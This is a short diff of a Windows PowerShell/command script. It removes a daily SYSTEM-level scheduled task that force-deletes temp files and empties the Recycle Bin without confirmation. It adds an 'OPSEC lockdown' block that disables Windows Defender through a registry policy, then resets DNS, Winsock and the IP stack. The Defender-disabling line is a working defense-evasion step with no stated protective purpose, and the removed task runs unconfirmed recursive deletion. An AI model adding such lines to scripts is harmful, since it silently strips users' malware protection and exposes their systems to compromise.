@@ -1,3 +1,5 @@
-$action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -Command `"Remove-Item -Path '$env:TEMP\*' -Recurse -Force; Clear-RecycleBin -Force -Confirm:`$false`""
-$trigger = New-ScheduledTaskTrigger -Daily -At "3AM"
-Register-ScheduledTask -TaskName "ZORGAutoSpaceRape" -Action $action -Trigger $trigger -User "System" -RunLevel Highest -Force
+# Nuclear OPSEC lockdown
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+ipconfig /flushdns
+netsh winsock reset
+netsh int ip reset
